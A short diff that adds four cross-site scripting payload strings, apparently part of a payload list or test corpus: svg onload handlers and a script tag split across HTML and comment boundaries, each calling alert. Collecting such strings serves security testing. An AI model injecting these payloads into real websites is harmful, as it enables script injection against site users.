@@ -1,0 +1,4 @@
+><svg/src=a onload=alert(1)><a
+%0aonload=alert(1)
+<svg/onload=alert(1)>
+<h3><script>/*</h3><br>*/alert(document.domain)//</p></script></h3>
